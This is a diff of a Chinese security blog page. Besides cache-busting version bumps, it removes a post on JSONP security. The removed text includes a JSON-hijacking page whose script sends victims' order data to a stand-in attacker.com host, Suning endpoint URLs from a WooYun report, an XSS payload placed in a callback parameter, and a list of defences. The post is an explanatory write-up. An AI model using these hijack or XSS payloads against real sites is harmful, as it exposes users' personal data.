@@ -8,7 +8,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://zzggtt.github.io/favicon.ico?v=1595669986778">
+<link rel="shortcut icon" href="https://zzggtt.github.io/favicon.ico?v=1595670038708">
 <link rel="stylesheet" href="https://zzggtt.github.io/styles/main.css">
 
 
@@ -23,11 +23,7 @@
 
 在写的过程中，我深深体会到分享者才是学习中的最大受益者，由于需要成文章，所以需要查阅大量的资料。在整个过程中，又学习到很多知识点。
 
-一、JSONP原理
-
-参考文章：
-
-https://blog.csd..." />
+..." />
     <meta name="keywords" content="" />
   </head>
   <body>
@@ -37,7 +33,7 @@ https://blog.csd..." />
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://zzggtt.github.io">
-        <img src="https://zzggtt.github.io/images/avatar.png?v=1595669986778" class="site-logo">
+        <img src="https://zzggtt.github.io/images/avatar.png?v=1595670038708" class="site-logo">
         <h1 class="site-title">ZG0T01</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -107,87 +103,6 @@ https://blog.csd..." />
 <p>今天在亮神的博客看见一句话：</p>
 <blockquote>
 <p>在写的过程中，我深深体会到分享者才是学习中的最大受益者，由于需要成文章，所以需要查阅大量的资料。在整个过程中，又学习到很多知识点。</p>
-</blockquote>
-<h3 id="一-jsonp原理">一、JSONP原理</h3>
-<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1595666965734.png" alt="" loading="lazy"></figure>
-<p><strong>参考文章</strong>：</p>
-<blockquote>
-<p>https://blog.csdn.net/hansexploration/article/details/80314948</p>
-<p>https://www.cnblogs.com/soyxiaobi/p/9616011.html</p>
-</blockquote>
-<h3 id="二-jsonp安全问题">二、JSONP安全问题</h3>
-<h4 id="1-跨域劫持">1、跨域劫持</h4>
-<p>JSONP虽然解决了前端AJAX无法跨域的问题，但是也带来了风险：JSON Hijaking（JSON 劫持）。JSON Hijacking技术非常经典，攻击的过程是CSRF，但是是对JSONP返回的JSON数据进行劫持。</p>
-<p>当目标网站通过JSONP的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的JSONP利用页面，然后诱导已登陆目标网站的用户访问恶意页面，以达到劫持用户敏感信息的目的。</p>
-<p>以乌云网上报告的一个例子（wooyun-2015-0118712）来分析：</p>
-<p>苏宁易购基本所有jsonp接口都没有做防护，导致第三方网站可调用苏宁的jsonp接口获取到用户敏感信息：</p>
-<ul>
-<li>
-<p>漏洞处功能详细说明：</p>
-<blockquote>
-<ul>
-<li>获取用户登陆状态的接口[是否登陆，会员编号] http://my.suning.com/authStatus?callback=jQuery17206592</li>
-<li>获取用户个人信息的接口[加星的邮箱，用户级别，用户安全等级等] http://my.suning.com/memberInfoPageHead.do?callback=jQuery1720402</li>
-<li>获取用户订单信息[下单时间，订单号，订单商品，订单金额，订单状态等] http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=jQuery1720659299</li>
-<li>获取用户地址簿接口[所有姓名、住址、加星手机号] http://my.suning.com/address.do?callback=jQuery172081</li>
-</ul>
-</blockquote>
-</li>
-<li>
-<p>攻击流程：</p>
-<ul>
-<li>
-<p>攻击者构造一个劫持页面：</p>
-<pre><code class="language-html">&lt;!--编写一个劫持函数：hijack --&gt;
-&lt;script&gt;
-    function hijack(){
-        //alert(data);
-        new Image().src=&quot;http://www.attacker.com/hijack.php?hi=&quot; + escape(data);//将劫持到的数据发送到攻击者服务器上
-    }
-&lt;/script&gt;
-
-&lt;!--获取用户订单信息接口：使用hijack为回调函数--&gt;
-&lt;script src=&quot;http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=hijack&quot;&gt;&lt;/script&gt;
-</code></pre>
-</li>
-<li>
-<p>然后攻击者欺骗已登陆目标网站（苏宁）的用户访问该页面。</p>
-<blockquote>
-<p>这个攻击过程其实是浏览器发起了一个 CSRF GET 请求。由于目标用户已登陆，所以浏览器发起请求会带上目标用户的cookie身份认证信息，并且服务端返回敏感信息。</p>
-</blockquote>
-</li>
-<li>
-<p>然后目标用户的订单信息就会被劫持发送到攻击者服务器上。</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-callback可控导致的xss">2、callback可控导致的xss</h4>
-<p>服务端在返回数据时，如果没有严格定义好Content-Type（Content-Type: application/json），再加上callback这个输出点没有进行过滤，而直接输出就会导致一个典型的XSS。</p>
-<p>例如如下一个jsonp接口：</p>
-<pre><code class="language-html">http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=?
-</code></pre>
-<p>客户端除了传递<code>q=?</code>以外，还会传递一个回调函数名给服务端<code>callback=?</code>。</p>
-<p>如果Content-Type（application / javascript）和callback未作过滤，直接返回。通过下面的payload就可以构造一个XSS：</p>
-<pre><code class="language-html">http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre>
-<h3 id="三-jsonp防御措施">三、JSONP防御措施</h3>
-<h4 id="1-验证referer">1、验证referer</h4>
-<blockquote>
-<p>通过验证 JSON 文件调用的来源（ Referer ）。这个方案是主要利用了 <script> 远程加载 JSON 文件时会发送 Referer ，在网站输出 JSON 数据时判断 Referer 是不是白名单合法的就可以进行防御！</p>
-</blockquote>
-<h4 id="2-随机token">2、随机token</h4>
-<h4 id="3-严格定义-content-type-application-json">3、严格定义 Content-Type: application / json</h4>
-<blockquote>
-<p>这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码。</p>
-</blockquote>
-<h4 id="4-过滤-callback-以及-json-数据输出">4、过滤 callback 以及 JSON 数据输出</h4>
-<blockquote>
-<p>还可以在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。</p>
-</blockquote>
-<p><strong>参考文章：</strong></p>
-<blockquote>
-<p>https://blog.knownsec.com/2015/03/jsonp_security_technic/</p>
 </blockquote>
 
             </div>
